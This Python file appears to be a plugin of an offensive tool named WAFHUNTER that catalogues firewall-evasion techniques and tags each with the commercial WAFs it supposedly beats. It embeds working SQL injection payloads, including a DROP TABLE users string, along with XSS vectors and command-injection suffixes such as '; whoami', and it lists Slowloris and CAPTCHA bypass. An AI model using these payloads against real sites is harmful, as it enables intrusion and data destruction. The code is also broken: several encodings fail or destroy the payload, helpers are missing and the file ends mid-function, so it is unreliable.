#!/usr/bin/env python3
"""
WAFHUNTER - Bypass Techniques Plugin
Advanced WAF bypass techniques and evasion methods
"""

import random
import string
import urllib.parse
import base64
import hashlib
import time
from typing import List, Dict, Any, Callable

class BypassTechniques:
    """Advanced WAF bypass techniques"""
    
    def __init__(self):
        self.techniques = {
            'encoding': self._get_encoding_techniques(),
            'case_variations': self._get_case_variations(),
            'whitespace_manipulation': self._get_whitespace_techniques(),
            'unicode_evasion': self._get_unicode_techniques(),
            'protocol_evasion': self._get_protocol_techniques(),
            'header_manipulation': self._get_header_techniques(),
            'timing_evasion': self._get_timing_techniques(),
            'obfuscation': self._get_obfuscation_techniques(),
            'parameter_pollution': self._get_parameter_pollution_techniques(),
            'chunked_encoding': self._get_chunked_encoding_techniques(),
            'sql_injection_evasion': self._get_sql_injection_evasion(),
            'xss_evasion': self._get_xss_evasion(),
            'command_injection_evasion': self._get_command_injection_evasion(),
            'advanced_evasion': self._get_advanced_evasion_techniques()
        }
    
    def _get_encoding_techniques(self) -> List[Dict[str, Any]]:
        """Get encoding-based bypass techniques"""
        return [
            {
                'name': 'URL Encoding',
                'description': 'Encode special characters in URLs',
                'example': lambda payload: urllib.parse.quote(payload),
                'applicable_wafs': ['Generic', 'ModSecurity', 'Cloudflare', 'AWS WAF']
            },
            {
                'name': 'Double URL Encoding',
                'description': 'Apply URL encoding twice',
                'example': lambda payload: urllib.parse.quote(urllib.parse.quote(payload)),
                'applicable_wafs': ['Generic', 'ModSecurity', 'Imperva Incapsula']
            },
            {
                'name': 'Triple URL Encoding',
                'description': 'Apply URL encoding three times',
                'example': lambda payload: urllib.parse.quote(urllib.parse.quote(urllib.parse.quote(payload))),
                'applicable_wafs': ['Generic', 'ModSecurity']
            },
            {
                'name': 'Partial URL Encoding',
                'description': 'Encode only specific characters',
                'example': lambda payload: self._partial_url_encode(payload),
                'applicable_wafs': ['Generic', 'ModSecurity', 'Cloudflare']
            },
            {
                'name': 'Unicode Encoding',
                'description': 'Use Unicode escape sequences',
                'example': lambda payload: payload.encode('unicode_escape').decode('ascii'),
                'applicable_wafs': ['Generic', 'ModSecurity', 'F5 BIG-IP']
            },
            {
                'name': 'Hex Encoding',
                'description': 'Encode characters as hexadecimal',
                'example': lambda payload: ''.join(f'%{ord(c):02x}' for c in payload),
                'applicable_wafs': ['Generic', 'ModSecurity', 'Barracuda']
            },
            {
                'name': 'Base64 Encoding',
                'description': 'Encode payload in Base64',
                'example': lambda payload: base64.b64encode(payload.encode()).decode(),
                'applicable_wafs': ['Generic', 'ModSecurity', 'Cloudflare']
            },
            {
                'name': 'Base64 URL Encoding',
                'description': 'URL-safe Base64 encoding',
                'example': lambda payload: base64.urlsafe_b64encode(payload.encode()).decode(),
                'applicable_wafs': ['Generic', 'ModSecurity', 'AWS WAF']
            },
            {
                'name': 'HTML Entity Encoding',
                'description': 'Convert to HTML entities',
                'example': lambda payload: self._html_entity_encode(payload),
                'applicable_wafs': ['Generic', 'ModSecurity', 'Cloudflare']
            },
            {
                'name': 'UTF-7 Encoding',
                'description': 'Use UTF-7 encoding',
                'example': lambda payload: self._utf7_encode(payload),
                'applicable_wafs': ['Generic', 'ModSecurity']
            },
            {
                'name': 'UTF-16 Encoding',
                'description': 'Use UTF-16 encoding',
                'example': lambda payload: payload.encode('utf-16').hex(),
                'applicable_wafs': ['Generic', 'ModSecurity']
            },
            {
                'name': 'UTF-32 Encoding',
                'description': 'Use UTF-32 encoding',
                'example': lambda payload: payload.encode('utf-32').hex(),
                'applicable_wafs': ['Generic', 'ModSecurity']
            },
            {
                'name': 'Octal Encoding',
                'description': 'Encode characters as octal',
                'example': lambda payload: ''.join(f'\\{ord(c):03o}' for c in payload),
                'applicable_wafs': ['Generic', 'ModSecurity']
            },
            {
                'name': 'Binary Encoding',
                'description': 'Encode characters as binary',
                'example': lambda payload: ''.join(f'\\{ord(c):08b}' for c in payload),
                'applicable_wafs': ['Generic', 'ModSecurity']
            },
            {
                'name': 'ROT13 Encoding',
                'description': 'Apply ROT13 transformation',
                'example': lambda payload: payload.encode('rot13'),
                'applicable_wafs': ['Generic', 'ModSecurity']
            },
            {
                'name': 'MD5 Hash Obfuscation',
                'description': 'Convert to MD5 hash',
                'example': lambda payload: hashlib.md5(payload.encode()).hexdigest(),
                'applicable_wafs': ['Generic', 'ModSecurity']
            },
            {
                'name': 'SHA1 Hash Obfuscation',
                'description': 'Convert to SHA1 hash',
                'example': lambda payload: hashlib.sha1(payload.encode()).hexdigest(),
                'applicable_wafs': ['Generic', 'ModSecurity']
            }
        ]
    
    def _get_case_variations(self) -> List[Dict[str, Any]]:
        """Get case variation techniques"""
        return [
            {
                'name': 'Mixed Case',
                'description': 'Use mixed case for keywords',
                'example': lambda payload: self._randomize_case(payload),
                'applicable_wafs': ['Generic', 'ModSecurity', 'Cloudflare', 'AWS WAF']
            },
            {
                'name': 'Lowercase',
                'description': 'Convert to lowercase',
                'example': lambda payload: payload.lower(),
                'applicable_wafs': ['Generic', 'ModSecurity', 'Imperva Incapsula']
            },
            {
                'name': 'Uppercase',
                'description': 'Convert to uppercase',
                'example': lambda payload: payload.upper(),
                'applicable_wafs': ['Generic', 'ModSecurity', 'F5 BIG-IP']
            },
            {
                'name': 'Title Case',
                'description': 'Convert to title case',
                'example': lambda payload: payload.title(),
                'applicable_wafs': ['Generic', 'ModSecurity']
            },
            {
                'name': 'Alternating Case',
                'description': 'Alternate between uppercase and lowercase',
                'example': lambda payload: self._alternating_case(payload),
                'applicable_wafs': ['Generic', 'ModSecurity', 'Cloudflare']
            },
            {
                'name': 'Random Case',
                'description': 'Randomly change case of characters',
                'example': lambda payload: self._random_case(payload),
                'applicable_wafs': ['Generic', 'ModSecurity', 'AWS WAF']
            }
        ]
    
    def _get_whitespace_techniques(self) -> List[Dict[str, Any]]:
        """Get whitespace manipulation techniques"""
        return [
            {
                'name': 'Tab Characters',
                'description': 'Replace spaces with tabs',
                'example': lambda payload: payload.replace(' ', '\t'),
                'applicable_wafs': ['Generic', 'ModSecurity', 'Cloudflare']
            },
            {
                'name': 'Newline Characters',
                'description': 'Insert newline characters',
                'example': lambda payload: payload.replace(' ', '\n'),
                'applicable_wafs': ['Generic', 'ModSecurity', 'AWS WAF']
            },
            {
                'name': 'Carriage Return',
                'description': 'Use carriage return characters',
                'example': lambda payload: payload.replace(' ', '\r'),
                'applicable_wafs': ['Generic', 'ModSecurity', 'F5 BIG-IP']
            },
            {
                'name': 'Multiple Spaces',
                'description': 'Use multiple spaces',
                'example': lambda payload: payload.replace(' ', '  '),
                'applicable_wafs': ['Generic', 'ModSecurity', 'Imperva Incapsula']
            },
            {
                'name': 'Zero Width Spaces',
                'description': 'Insert zero-width spaces',
                'example': lambda payload: self._insert_zero_width_spaces(payload),
                'applicable_wafs': ['Generic', 'ModSecurity', 'Cloudflare']
            },
            {
                'name': 'Non-breaking Spaces',
                'description': 'Use non-breaking spaces (\\u00A0)',
                'example': lambda payload: payload.replace(' ', '\u00A0'),
                'applicable_wafs': ['Generic', 'ModSecurity', 'AWS WAF']
            },
            {
                'name': 'Vertical Tab',
                'description': 'Use vertical tab characters',
                'example': lambda payload: payload.replace(' ', '\v'),
                'applicable_wafs': ['Generic', 'ModSecurity']
            },
            {
                'name': 'Form Feed',
                'description': 'Use form feed characters',
                'example': lambda payload: payload.replace(' ', '\f'),
                'applicable_wafs': ['Generic', 'ModSecurity']
            },
            {
                'name': 'Mixed Whitespace',
                'description': 'Mix different whitespace characters',
                'example': lambda payload: self._mixed_whitespace(payload),
                'applicable_wafs': ['Generic', 'ModSecurity', 'Cloudflare']
            },
            {
                'name': 'No Whitespace',
                'description': 'Remove all whitespace',
                'example': lambda payload: payload.replace(' ', ''),
                'applicable_wafs': ['Generic', 'ModSecurity', 'AWS WAF']
            }
        ]
    
    def _get_unicode_techniques(self) -> List[Dict[str, Any]]:
        """Get Unicode evasion techniques"""
        return [
            {
                'name': 'Fullwidth Characters',
                'description': 'Use fullwidth Unicode characters',
                'example': lambda payload: self._to_fullwidth(payload),
                'applicable_wafs': ['Generic', 'ModSecurity', 'Cloudflare', 'AWS WAF']
            },
            {
                'name': 'Zero Width Characters',
                'description': 'Insert zero-width characters',
                'example': lambda payload: self._insert_zero_width(payload),
                'applicable_wafs': ['Generic', 'ModSecurity', 'F5 BIG-IP']
            },
            {
                'name': 'Homoglyph Substitution',
                'description': 'Replace characters with similar-looking ones',
                'example': lambda payload: self._homoglyph_substitute(payload),
                'applicable_wafs': ['Generic', 'ModSecurity', 'Cloudflare', 'AWS WAF']
            },
            {
                'name': 'Unicode Normalization',
                'description': 'Use different Unicode normalization forms',
                'example': lambda payload: self._unicode_normalize(payload),
                'applicable_wafs': ['Generic', 'ModSecurity', 'Imperva Incapsula']
            },
            {
                'name': 'Right-to-Left Override',
                'description': 'Use RTL override characters',
                'example': lambda payload: self._rtl_override(payload),
                'applicable_wafs': ['Generic', 'ModSecurity', 'Cloudflare']
            },
            {
                'name': 'Combining Characters',
                'description': 'Use combining diacritical marks',
                'example': lambda payload: self._combining_characters(payload),
                'applicable_wafs': ['Generic', 'ModSecurity', 'AWS WAF']
            },
            {
                'name': 'Mathematical Alphanumeric',
                'description': 'Use mathematical alphanumeric symbols',
                'example': lambda payload: self._math_alphanumeric(payload),
                'applicable_wafs': ['Generic', 'ModSecurity']
            },
            {
                'name': 'Emoji Substitution',
                'description': 'Replace characters with similar emojis',
                'example': lambda payload: self._emoji_substitute(payload),
                'applicable_wafs': ['Generic', 'ModSecurity', 'Cloudflare']
            }
        ]
    
    def _get_protocol_techniques(self) -> List[Dict[str, Any]]:
        """Get protocol-based evasion techniques"""
        return [
            {
                'name': 'HTTP/2 Multiplexing',
                'description': 'Use HTTP/2 multiplexing to bypass rate limits',
                'example': lambda payload: payload,
                'applicable_wafs': ['Cloudflare', 'AWS WAF', 'Imperva Incapsula']
            },
            {
                'name': 'HTTP/3 QUIC',
                'description': 'Use HTTP/3 QUIC protocol',
                'example': lambda payload: payload,
                'applicable_wafs': ['Cloudflare', 'AWS WAF', 'CloudFront']
            },
            {
                'name': 'Different TLS Versions',
                'description': 'Use different TLS versions',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'F5 BIG-IP', 'ModSecurity']
            },
            {
                'name': 'TLS Fingerprint Spoofing',
                'description': 'Spoof TLS fingerprint to mimic legitimate clients',
                'example': lambda payload: payload,
                'applicable_wafs': ['Cloudflare', 'AWS WAF', 'Imperva Incapsula']
            },
            {
                'name': 'HTTP Pipelining',
                'description': 'Send multiple HTTP requests in a single connection',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'ModSecurity', 'F5 BIG-IP']
            },
            {
                'name': 'HTTP Request Smuggling',
                'description': 'Exploit HTTP request parsing inconsistencies',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'ModSecurity', 'Cloudflare']
            },
            {
                'name': 'HTTP Response Splitting',
                'description': 'Inject CRLF sequences to split HTTP responses',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'ModSecurity', 'F5 BIG-IP']
            },
            {
                'name': 'WebSocket Protocol',
                'description': 'Use WebSocket protocol for evasion',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'Cloudflare', 'AWS WAF']
            },
            {
                'name': 'HTTP/0.9 Protocol',
                'description': 'Use legacy HTTP/0.9 protocol',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'ModSecurity']
            },
            {
                'name': 'IP Protocol Switching',
                'description': 'Switch between IPv4 and IPv6',
                'example': lambda payload: payload,
                'applicable_wafs': ['Cloudflare', 'AWS WAF', 'Imperva Incapsula']
            }
        ]
    
    def _get_header_techniques(self) -> List[Dict[str, Any]]:
        """Get header manipulation techniques"""
        return [
            {
                'name': 'Custom User-Agent',
                'description': 'Use different User-Agent strings',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'Cloudflare', 'AWS WAF', 'Imperva Incapsula']
            },
            {
                'name': 'Header Ordering',
                'description': 'Change header order to bypass pattern matching',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'ModSecurity', 'F5 BIG-IP']
            },
            {
                'name': 'Header Duplication',
                'description': 'Duplicate headers with different values',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'ModSecurity', 'Cloudflare']
            },
            {
                'name': 'Header Case Variation',
                'description': 'Use different header case',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'ModSecurity', 'AWS WAF']
            },
            {
                'name': 'X-Forwarded-For Spoofing',
                'description': 'Spoof X-Forwarded-For header',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'Cloudflare', 'AWS WAF']
            },
            {
                'name': 'X-Real-IP Spoofing',
                'description': 'Spoof X-Real-IP header',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'Cloudflare', 'AWS WAF']
            },
            {
                'name': 'Referer Header Spoofing',
                'description': 'Spoof Referer header',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'ModSecurity', 'Cloudflare']
            },
            {
                'name': 'Origin Header Spoofing',
                'description': 'Spoof Origin header',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'Cloudflare', 'AWS WAF']
            },
            {
                'name': 'Host Header Injection',
                'description': 'Inject malicious Host header values',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'ModSecurity', 'F5 BIG-IP']
            },
            {
                'name': 'Cookie Header Manipulation',
                'description': 'Manipulate Cookie header structure',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'Cloudflare', 'AWS WAF']
            },
            {
                'name': 'Accept-Encoding Manipulation',
                'description': 'Manipulate Accept-Encoding header',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'ModSecurity', 'Cloudflare']
            },
            {
                'name': 'Content-Type Spoofing',
                'description': 'Spoof Content-Type header',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'ModSecurity', 'AWS WAF']
            },
            {
                'name': 'X-Requested-With Manipulation',
                'description': 'Manipulate X-Requested-With header',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'Cloudflare', 'AWS WAF']
            },
            {
                'name': 'Custom Headers',
                'description': 'Add custom headers to bypass filtering',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'ModSecurity', 'F5 BIG-IP']
            }
        ]
    
    def _get_timing_techniques(self) -> List[Dict[str, Any]]:
        """Get timing-based evasion techniques"""
        return [
            {
                'name': 'Request Spacing',
                'description': 'Add delays between requests',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'Cloudflare', 'AWS WAF', 'Imperva Incapsula']
            },
            {
                'name': 'Burst Requests',
                'description': 'Send requests in bursts to bypass rate limits',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'Cloudflare', 'AWS WAF']
            },
            {
                'name': 'Random Timing',
                'description': 'Use random timing intervals',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'Cloudflare', 'AWS WAF', 'F5 BIG-IP']
            },
            {
                'name': 'Slowloris Attack',
                'description': 'Send headers slowly to keep connections open',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'ModSecurity', 'F5 BIG-IP']
            },
            {
                'name': 'RUDY Attack',
                'description': 'Send request body slowly',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'ModSecurity', 'Cloudflare']
            },
            {
                'name': 'Time-based Evasion',
                'description': 'Vary timing based on server response times',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'Cloudflare', 'AWS WAF']
            },
            {
                'name': 'Session Puzzling',
                'description': 'Manipulate session timing',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'ModSecurity', 'F5 BIG-IP']
            },
            {
                'name': 'Clock Skew Exploitation',
                'description': 'Exploit server clock skew',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'Cloudflare', 'AWS WAF']
            }
        ]
    
    def _get_obfuscation_techniques(self) -> List[Dict[str, Any]]:
        """Get obfuscation techniques"""
        return [
            {
                'name': 'String Concatenation',
                'description': 'Split strings and concatenate at runtime',
                'example': lambda payload: self._string_concatenation(payload),
                'applicable_wafs': ['Generic', 'ModSecurity', 'Cloudflare']
            },
            {
                'name': 'Comment Injection',
                'description': 'Inject comments to break up patterns',
                'example': lambda payload: self._comment_injection(payload),
                'applicable_wafs': ['Generic', 'ModSecurity', 'AWS WAF']
            },
            {
                'name': 'JavaScript Obfuscation',
                'description': 'Obfuscate JavaScript code',
                'example': lambda payload: self._js_obfuscation(payload),
                'applicable_wafs': ['Generic', 'Cloudflare', 'Imperva Incapsula']
            },
            {
                'name': 'CSS Obfuscation',
                'description': 'Obfuscate CSS expressions',
                'example': lambda payload: self._css_obfuscation(payload),
                'applicable_wafs': ['Generic', 'ModSecurity', 'Cloudflare']
            },
            {
                'name': 'HTML Obfuscation',
                'description': 'Obfuscate HTML attributes and tags',
                'example': lambda payload: self._html_obfuscation(payload),
                'applicable_wafs': ['Generic', 'ModSecurity', 'AWS WAF']
            },
            {
                'name': 'SQL Comment Obfuscation',
                'description': 'Use SQL comments to break up queries',
                'example': lambda payload: self._sql_comment_obfuscation(payload),
                'applicable_wafs': ['Generic', 'ModSecurity', 'F5 BIG-IP']
            },
            {
                'name': 'Polymorphic Code',
                'description': 'Generate polymorphic code variations',
                'example': lambda payload: self._polymorphic_code(payload),
                'applicable_wafs': ['Generic', 'Cloudflare', 'AWS WAF']
            },
            {
                'name': 'Dead Code Injection',
                'description': 'Inject dead code to confuse analysis',
                'example': lambda payload: self._dead_code_injection(payload),
                'applicable_wafs': ['Generic', 'ModSecurity', 'Imperva Incapsula']
            },
            {
                'name': 'Code Reordering',
                'description': 'Reorder code execution',
                'example': lambda payload: self._code_reordering(payload),
                'applicable_wafs': ['Generic', 'Cloudflare', 'AWS WAF']
            }
        ]
    
    def _get_parameter_pollution_techniques(self) -> List[Dict[str, Any]]:
        """Get parameter pollution techniques"""
        return [
            {
                'name': 'Duplicate Parameters',
                'description': 'Send duplicate parameters with different values',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'ModSecurity', 'Cloudflare']
            },
            {
                'name': 'Parameter Order Variation',
                'description': 'Change parameter order',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'ModSecurity', 'AWS WAF']
            },
            {
                'name': 'Array Parameter Injection',
                'description': 'Use array parameters to bypass filtering',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'ModSecurity', 'F5 BIG-IP']
            },
            {
                'name': 'JSON Parameter Pollution',
                'description': 'Pollute JSON parameters',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'Cloudflare', 'AWS WAF']
            },
            {
                'name': 'XML Parameter Pollution',
                'description': 'Pollute XML parameters',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'ModSecurity', 'Imperva Incapsula']
            },
            {
                'name': 'HTTP Parameter Contamination',
                'description': 'Contaminate HTTP parameters',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'Cloudflare', 'AWS WAF']
            }
        ]
    
    def _get_chunked_encoding_techniques(self) -> List[Dict[str, Any]]:
        """Get chunked encoding techniques"""
        return [
            {
                'name': 'Chunked Transfer Encoding',
                'description': 'Use chunked transfer encoding',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'ModSecurity', 'Cloudflare']
            },
            {
                'name': 'Chunk Size Manipulation',
                'description': 'Manipulate chunk sizes',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'ModSecurity', 'AWS WAF']
            },
            {
                'name': 'Chunk Boundary Obfuscation',
                'description': 'Obfuscate chunk boundaries',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'ModSecurity', 'F5 BIG-IP']
            },
            {
                'name': 'Chunked Encoding Bypass',
                'description': 'Bypass WAF with chunked encoding',
                'example': lambda payload: payload,
                'applicable_wafs': ['Generic', 'Cloudflare', 'AWS WAF']
            }
        ]
    
    def _get_sql_injection_evasion(self) -> List[Dict[str, Any]]:
        """Get SQL injection evasion techniques"""
        return [
            {
                'name': 'SQL Comment Bypass',
                'description': 'Use SQL comments to bypass filters',
                'example': lambda payload: payload.replace("'", "'/**/"),
                'applicable_wafs': ['Generic', 'ModSecurity', 'Cloudflare']
            },
            {
                'name': 'SQL Keyword Obfuscation',
                'description': 'Obfuscate SQL keywords',
                'example': lambda payload: payload.replace("SELECT", "SEL" + "ECT"),
                'applicable_wafs': ['Generic', 'ModSecurity', 'AWS WAF']
            },
            {
                'name': 'SQL Hex Encoding',
                'description': 'Use hex encoding for SQL values',
                'example': lambda payload: payload.replace("'", "0x" + "admin".encode().hex()),
                'applicable_wafs': ['Generic', 'ModSecurity', 'F5 BIG-IP']
            },
            {
                'name': 'SQL Time-based Blind',
                'description': 'Use time-based blind SQL injection',
                'example': lambda payload: payload + "' AND SLEEP(5)--",
                'applicable_wafs': ['Generic', 'ModSecurity', 'Cloudflare']
            },
            {
                'name': 'SQL Boolean-based Blind',
                'description': 'Use boolean-based blind SQL injection',
                'example': lambda payload: payload + "' AND 1=1--",
                'applicable_wafs': ['Generic', 'ModSecurity', 'AWS WAF']
            },
            {
                'name': 'SQL Stacked Queries',
                'description': 'Use stacked queries',
                'example': lambda payload: payload + "'; DROP TABLE users--",
                'applicable_wafs': ['Generic', 'ModSecurity', 'F5 BIG-IP']
            },
            {
                'name': 'SQL UNION Bypass',
                'description': 'Bypass UNION-based SQL injection filters',
                'example': lambda payload: payload.replace("UNION", "UNI" + "ON"),
                'applicable_wafs': ['Generic', 'ModSecurity', 'Cloudflare']
            },
            {
                'name': 'SQL Error-based',
                'description': 'Use error-based SQL injection',
                'example': lambda payload: payload + "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
                'applicable_wafs': ['Generic', 'ModSecurity', 'AWS WAF']
            }
        ]
    
    def _get_xss_evasion(self) -> List[Dict[str, Any]]:
        """Get XSS evasion techniques"""
        return [
            {
                'name': 'XSS Event Handler Bypass',
                'description': 'Use event handlers for XSS',
                'example': lambda payload: '<img src=x onerror="alert(1)">',
                'applicable_wafs': ['Generic', 'ModSecurity', 'Cloudflare']
            },
            {
                'name': 'XSS JavaScript URI Bypass',
                'description': 'Use JavaScript URIs',
                'example': lambda payload: '<a href="javascript:alert(1)">Click</a>',
                'applicable_wafs': ['Generic', 'ModSecurity', 'AWS WAF']
            },
            {
                'name': 'XSS SVG Bypass',
                'description': 'Use SVG for XSS',
                'example': lambda payload: '<svg onload="alert(1)"></svg>',
                'applicable_wafs': ['Generic', 'ModSecurity', 'F5 BIG-IP']
            },
            {
                'name': 'XSS Data URI Bypass',
                'description': 'Use data URIs for XSS',
                'example': lambda payload: '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>',
                'applicable_wafs': ['Generic', 'ModSecurity', 'Cloudflare']
            },
            {
                'name': 'XSS Template Literal Bypass',
                'description': 'Use template literals for XSS',
                'example': lambda payload: '<script>alert`1`</script>',
                'applicable_wafs': ['Generic', 'ModSecurity', 'AWS WAF']
            },
            {
                'name': 'XSS Unicode Bypass',
                'description': 'Use Unicode for XSS evasion',
                'example': lambda payload: '<script>\u0061\u006C\u0065\u0072\u0074(1)</script>',
                'applicable_wafs': ['Generic', 'ModSecurity', 'F5 BIG-IP']
            },
            {
                'name': 'XSS DOM-based Bypass',
                'description': 'Use DOM-based XSS techniques',
                'example': lambda payload: '<script>eval(location.hash.slice(1))</script>',
                'applicable_wafs': ['Generic', 'ModSecurity', 'Cloudflare']
            },
            {
                'name': 'XSS Mutation-based Bypass',
                'description': 'Use mutation-based XSS techniques',
                'example': lambda payload: '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
                'applicable_wafs': ['Generic', 'ModSecurity', 'AWS WAF']
            }
        ]
    
    def _get_command_injection_evasion(self) -> List[Dict[str, Any]]:
        """Get command injection evasion techniques"""
        return [
            {
                'name': 'Command Injection Semicolon',
                'description': 'Use semicolon for command injection',
                'example': lambda payload: payload + '; whoami',
                'applicable_wafs': ['Generic', 'ModSecurity', 'Cloudflare']
            },
            {
                'name': 'Command Injection Pipe',
                'description': 'Use pipe for command injection',
                'example': lambda payload: payload + ' | whoami',
                'applicable_wafs': ['Generic', 'ModSecurity', 'AWS WAF']
            },
            {
                'name': 'Command Injection Backtick',
                'description': 'Use backticks for command injection',
                'example': lambda payload: payload + ' `whoami`',
                'applicable_wafs': ['Generic', 'ModSecurity', 'F5 BIG-IP']
            },
            {
                'name': 'Command Injection Dollar',
                'description': 'Use dollar syntax for command injection',
                'example': lambda payload: payload + ' $(whoami)',
                'applicable_wafs': ['Generic', 'ModSecurity', 'Cloudflare']
            },
            {
                'name': 'Command Injection Newline',
                'description': 'Use newline for command injection',
                'example': lambda payload: payload + '\nwhoami',
                'applicable_wafs': ['Generic', 'ModSecurity', 'AWS WAF']
            },
            {
                'name': 'Command Injection AND',
                'description': 'Use AND operator for command injection',
                'example': lambda payload: payload + ' && whoami',
                'applicable_wafs': ['Generic', 'ModSecurity', 'F5 BIG-IP']
            },
            {
                'name': 'Command Injection OR',
                'description': 'Use OR operator for command injection',
                'example': lambda payload: payload + ' || whoami',
                'applicable_wafs': ['Generic', 'ModSecurity', 'Cloudflare']
            },
            {
                'name': 'Command Injection Subshell',
                'description': 'Use subshell for command injection',
                'example': lambda payload: payload + ' {whoami}',
                'applicable_wafs': ['Generic', 'ModSecurity', 'AWS WAF']
            }
        ]
    
    def _get_advanced_evasion_techniques(self) -> List[Dict[str, Any]]:
        """Get advanced evasion techniques"""
        return [
            {
                'name': 'Machine Learning Evasion',
                'description': 'Evade ML-based WAFs with adversarial examples',
                'example': lambda payload: self._ml_evasion(payload),
                'applicable_wafs': ['Cloudflare', 'AWS WAF', 'Imperva Incapsula']
            },
            {
                'name': 'Behavioral Analysis Bypass',
                'description': 'Bypass behavioral analysis with human-like patterns',
                'example': lambda payload: payload,
                'applicable_wafs': ['Cloudflare', 'AWS WAF', 'Imperva Incapsula']
            },
            {
                'name': 'Fingerprint Spoofing',
                'description': 'Spoof browser and device fingerprints',
                'example': lambda payload: payload,
                'applicable_wafs': ['Cloudflare', 'AWS WAF', 'Imperva Incapsula']
            },
            {
                'name': 'CAPTCHA Bypass',
                'description': 'Bypass CAPTCHA challenges',
                'example': lambda payload: payload,
                'applicable_wafs': ['Cloudflare', 'AWS WAF', 'Imperva Incapsula']
            },
            {
                'name': 'JavaScript Challenge Bypass',
                'description': 'Bypass JavaScript challenges',
                'example': lambda payload: payload,
                'applicable_wafs': ['Cloudflare', 'AWS WAF', 'Imperva Incapsula']
            },
            {
                'name': 'Cookie Challenge Bypass',
                'description': 'Bypass cookie-based challenges',
                'example': lambda payload: payload,
                'applicable_wafs': ['Cloudflare', 'AWS WAF', 'Imperva Incapsula']
            },
            {
                'name': 'IP Rotation',
                'description': 'Rotate IP addresses to bypass blocking',
                'example': lambda payload: payload,
                'applicable_wafs': ['Cloudflare', 'AWS WAF', 'Imperva Incapsula']
            },
            {
                'name': 'User-Agent Rotation',
                'description': 'Rotate User-Agent strings',
                'example': lambda payload: payload,
                'applicable_wafs': ['Cloudflare', 'AWS WAF', 'Imperva Incapsula']
            },
            {
                'name': 'Referer Spoofing',
                'description': 'Spoof Referer headers',
                'example': lambda payload: payload,
                'applicable_wafs': ['Cloudflare', 'AWS WAF', 'Imperva Incapsula']
            },
            {
                'name': 'Origin Spoofing',
                'description': 'Spoof Origin headers',
                'example': lambda payload: payload,
                'applicable_wafs': ['Cloudflare', 'AWS WAF', 'Imperva Incapsula']
            }
        ]
    
    # Helper methods for the techniques
    def _partial_url_encode(self, text: str) -> str:
        """Partially URL encode a string"""
        chars_to_encode = ['<', '>', '"', "'", '&', '=', ' ', ';', '%']
        result = []
        for char in text:
            if char in chars_to_encode and random.random() < 0.7:  # 70% chance
                result.append(urllib.parse.quote(char))
            else:
                result.append(char)
        return ''.join(result)
    
    def _html_entity_encode(self, text: str) -> str:
        """Convert text to HTML entities"""
        entity_map = {
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#39;',
            '&': '&amp;',
            '=': '&#61;',
            ' ': '&#32;'
        }
        return ''.join(entity_map.get(c, c) for c in text)
    
    def _utf7_encode(self, text: str) -> str:
        """Convert text to UTF-7 encoding"""
        try:
            return text.encode('utf-7').decode('ascii')
        except:
            return text
    
    def _alternating_case(self, text: str) -> str:
        """Alternate between uppercase and lowercase"""
        result = []
        upper = True
        for char in text:
            if char.isalpha():
                result.append(char.upper() if upper else char.lower())
                upper = not upper
            else:
                result.append(char)
        return ''.join(result)
    
    def _random_case(self, text: str) -> str:
        """Randomly change case of characters"""
        return ''.join(random.choice([c.upper(), c.lower()]) for c in text)
    
    def _insert_zero_width_spaces(self, text: str) -> str:
        """Insert zero-width spaces"""
        zero_width_chars = ['\u200B', '\u200C', '\u200D', '\uFEFF']
        result = []
        for char in text:
            result.append(char)
            if random.random() < 0.3:  # 30% chance
                result.append(random.choice(zero_width_chars))
        return ''.join(result)
    
    def _mixed_whitespace(self, text: str) -> str:
        """Mix different whitespace characters"""
        whitespace_chars = [' ', '\t', '\n', '\r', '\v', '\f', '\u00A0']
        result = []
        for char in text:
            if char.isspace():
                result.append(random.choice(whitespace_chars))
            else:
                result.append(char)
        return ''.join(result)
    
    def _unicode_normalize(self, text: str) -> str:
        """Apply Unicode normalization"""
        import unicodedata
        forms = ['NFC', 'NFD', 'NFKC', 'NFKD']
        form = random.choice(forms)
        return unicodedata.normalize(form, text)
    
    def _rtl_override(self, text: str) -> str:
        """Apply right-to-left override"""
        return '\u202E' + text + '\u202C'
    
    def _combining_characters(self, text: str) -> str:
